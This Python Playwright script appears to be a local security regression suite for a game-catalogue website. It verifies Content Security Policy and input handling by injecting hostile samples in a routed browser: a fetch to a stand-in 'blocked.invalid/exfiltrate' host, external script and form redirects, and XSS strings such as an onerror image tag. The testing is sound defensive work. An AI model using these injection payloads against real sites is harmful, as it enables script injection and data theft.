#!/usr/bin/env python3
"""Local, routed-browser regression tests. No probing of external hosts, no traffic floods."""
from __future__ import annotations
import argparse, hashlib, json, mimetypes, re, shutil, sys
from pathlib import Path
from urllib.parse import urlsplit, quote, unquote
from xml.etree import ElementTree as ET
from playwright.sync_api import sync_playwright
from prepare_security_release import BLOCK, csp, protected, sharing_files
from html.parser import HTMLParser
ROOT=Path(__file__).resolve().parents[1]
BASE='https://gamevault.test/xbox-game-vault/'
class Meta(HTMLParser):
 def __init__(self,text):
  super().__init__();self.policies=[];self.refs=[];self.events=[];self.scripts=[];self.feed(text)
 def handle_starttag(self,t,a):
  a=dict(a)
  if t=='meta' and a.get('http-equiv','').lower()=='content-security-policy':self.policies.append(a.get('content',''))
  if t=='meta' and a.get('name')=='referrer':self.refs.append(a.get('content'))
  self.events.extend(k for k in a if k.lower().startswith('on'))
  if t=='script' and a.get('src'):self.scripts.append(a['src'])
def main():
 ap=argparse.ArgumentParser();ap.add_argument('--out',default='verification/security');ap.add_argument('--dom-only',action='store_true');args=ap.parse_args()
 out=Path(args.out);out.mkdir(parents=True,exist_ok=True);checks=[]
 def check(name,ok,detail=''):
  checks.append({'name':name,'status':'PASS' if ok else 'FAIL','detail':detail})
  if not ok:print('FAIL',name,detail,flush=True)
 pages=[ROOT/'index.html',*sorted((ROOT/'oeffentlich').rglob('*.html'))]
 for p in pages:
  text=p.read_text();meta=Meta(text);rel=p.relative_to(ROOT).as_posix()
  check('Exact script-hash policy: '+rel,meta.policies==[csp(text)])
  check('No inline handlers: '+rel,not meta.events)
  check('No external script dependency: '+rel,not meta.scripts)
  check('Referrer reduction: '+rel,meta.refs==['no-referrer'])
 for p,text in sharing_files(ROOT).items():check('Fresh generated material: '+p.name,p.read_text()==text)
 data=json.loads((ROOT/'oeffentlich/reichweite/links.json').read_text())
 check('Ten approved sharing records',len(data['items'])==10 and data['automatic_sending'] is False)
 check('RSS parses and contains ten entries',len(ET.parse(ROOT/'oeffentlich/reichweite/feed.xml').findall('./channel/item'))==10)
 errors=[];requests=[];popups=[];not_tested=[]
 with sync_playwright() as pw:
  exe=shutil.which('chromium') or shutil.which('google-chrome')
  browser=pw.chromium.launch(headless=True,args=['--no-sandbox'],**({'executable_path':exe} if exe else {}))
  version=browser.version;ctx=browser.new_context(service_workers='block',viewport={'width':390,'height':844})
  def route(r):
   u=urlsplit(r.request.url)
   if u.hostname!='gamevault.test' or not u.path.startswith('/xbox-game-vault/'):
    requests.append(r.request.url);r.abort();return
   rel=unquote(u.path.removeprefix('/xbox-game-vault/'));p=(ROOT/rel).resolve()
   if not p.is_relative_to(ROOT):r.fulfill(status=403,body='Forbidden');return
   if p.is_dir():p=p/'index.html'
   if not p.is_file():r.fulfill(status=404,body='Not found');return
   r.fulfill(status=200,body=p.read_bytes(),content_type=mimetypes.guess_type(p.name)[0] or 'application/octet-stream')
  ctx.route('**/*',route);page=ctx.new_page();page.set_default_timeout(8000);page.on('pageerror',lambda e:errors.append(str(e)));page.on('popup',lambda p:popups.append(p))
  def load(query=''):
   if args.dom_only:page.set_content((ROOT/'oeffentlich/index.html').read_text())
   else:page.goto(BASE+'oeffentlich/'+query,wait_until='load')
   page.wait_for_timeout(50)
  try:
   load();check('Catalogue initializes under CSP',page.locator('[data-public-card]').count()==144)
   uid=page.locator('[data-public-card]').first.get_attribute('data-uid')
   page.evaluate("window.violations=[];document.addEventListener('securitypolicyviolation',e=>window.violations.push(e.effectiveDirective))")
   page.evaluate("(()=>{let s=document.createElement('script');s.textContent='window.untrustedInlineExecuted=true';document.body.append(s)})()")
   page.wait_for_timeout(50);check('Injected inline script blocked',page.evaluate('window.untrustedInlineExecuted!==true && window.violations.includes("script-src-elem")'))
   page.evaluate("(()=>{let b=document.createElement('button');b.setAttribute('onclick','window.untrustedHandlerExecuted=true');document.body.append(b);b.click();b.remove()})()")
   page.wait_for_timeout(50);check('Injected event handler blocked',page.evaluate('window.untrustedHandlerExecuted!==true && window.violations.includes("script-src-attr")'))
   page.evaluate("(()=>{let s=document.createElement('script');s.src='https://blocked.invalid/injected.js';document.body.append(s)})()")
   page.wait_for_timeout(50);check('External script request blocked before network',not any('injected.js' in u for u in requests))
   blocked=page.evaluate("async()=>{try{await fetch('https://blocked.invalid/exfiltrate');return false}catch(_){return true}}")
   check('External fetch blocked by policy',blocked and page.evaluate('window.violations.includes("connect-src")') and not any('exfiltrate' in u for u in requests))
   old=page.url;page.evaluate("(()=>{let f=document.createElement('form');f.action='https://blocked.invalid/submit';f.method='POST';document.body.append(f);f.requestSubmit();f.remove()})()")
   page.wait_for_timeout(50);check('Unapproved form submission blocked',page.url==old and page.evaluate('window.violations.includes("form-action")'))
   previous=page.evaluate('document.baseURI');page.evaluate("(()=>{let b=document.createElement('base');b.href='https://blocked.invalid/';document.head.append(b)})()")
   check('Base-URL replacement blocked',page.evaluate('document.baseURI')==previous and page.evaluate('window.violations.includes("base-uri")'))
   if not args.dom_only:
    text=(ROOT/'oeffentlich/index.html').read_text();key=re.search(r"storeKey\s*=\s*['\"]([^'\"]+)",text).group(1)
    for label,value in [('malformed JSON','{'),('wrong type','{}'),('untrusted ID',json.dumps(['<img src=x onerror=alert(1)>'])),('oversized','['+' '*11000+']'),('oversized array',json.dumps([uid]*501))]:
     page.evaluate('([k,v])=>localStorage.setItem(k,v)',[key,value]);load()
     check('Storage safely rejected: '+label,page.locator('#stickyCount').inner_text()=='0')
    page.evaluate('([k,v])=>localStorage.setItem(k,v)',[key,json.dumps([uid])]);load()
    check('Valid local wishlist preserved',page.locator('#stickyCount').inner_text()=='1')
    load('?auswahl='+quote('<script>window.inputExecuted=true</script>'))
    check('URL markup does not execute',page.evaluate('window.inputExecuted!==true') and page.locator('#stickyCount').inner_text()=='1')
    load('?auswahl='+('A'*17000));check('Oversized URL rejected without erasing wishlist',page.locator('#importSharedWishlist').is_hidden() and page.locator('#stickyCount').inner_text()=='1' and 'zu lang' in page.locator('#sharedSelectionDescription').inner_text())
   else:not_tested.append('Storage and URL injection need an origin; use the CI routed-browser test')
   for path in sorted((ROOT/'oeffentlich/plattform').glob('*.html')):
    if args.dom_only:
     page.close();page=ctx.new_page();page.set_default_timeout(8000);page.on('pageerror',lambda e:errors.append(str(e)));page.set_content(path.read_text())
    else:page.goto(BASE+path.relative_to(ROOT).as_posix())
    check('Platform initialized: '+path.name,page.locator('h1').count()==1)
    if page.locator('#closePlatformWishlist').count():
     page.locator('#openWishlistTop').click();page.locator('#closePlatformWishlist').click()
     check('Platform dialog closes without inline handler: '+path.name,not page.locator('#wishlistDialog').evaluate('(x)=>x.open'))
   if args.dom_only:
    page.close();page=ctx.new_page();page.set_content((ROOT/'oeffentlich/teilen.html').read_text())
   else:page.goto(BASE+'oeffentlich/teilen.html')
   check('Share page exposes generated materials',page.locator('a[href*="reichweite/"]').count()==3)
   for w in (320,390,768,1440):
    page.set_viewport_size({'width':w,'height':900});check('Share page fits '+str(w),page.evaluate('document.documentElement.scrollWidth<=innerWidth'))
   page.screenshot(path=str(out/'sharing-desktop.png'),full_page=True)
   page.set_viewport_size({'width':390,'height':844});page.screenshot(path=str(out/'sharing-mobile.png'),full_page=True)
   check('No unprompted outside request or popup',not requests and not popups,repr(requests));check('No uncaught JavaScript errors',not errors,repr(errors))
  except Exception as e:check('Security suite execution',False,repr(e))
  finally:ctx.close();browser.close()
 report={'scope':'LOCAL_DOM_ONLY' if args.dom_only else 'ROUTED_BROWSER_NOT_LIVE','browser':version,'passed':sum(c['status']=='PASS' for c in checks),'failed':sum(c['status']=='FAIL' for c in checks),'pages':len(pages),'checks':checks,'not_tested':not_tested,'not_covered':['WAF/DDoS','Account takeover','Branch protection enforcement','Historical backup HTML','Independent penetration test','Live server security headers']}
 (out/'results.json').write_text(json.dumps(report,ensure_ascii=False,indent=2));print(json.dumps({k:v for k,v in report.items() if k!='checks'},ensure_ascii=False,indent=2));return int(report['failed']>0)
if __name__=='__main__':sys.exit(main())
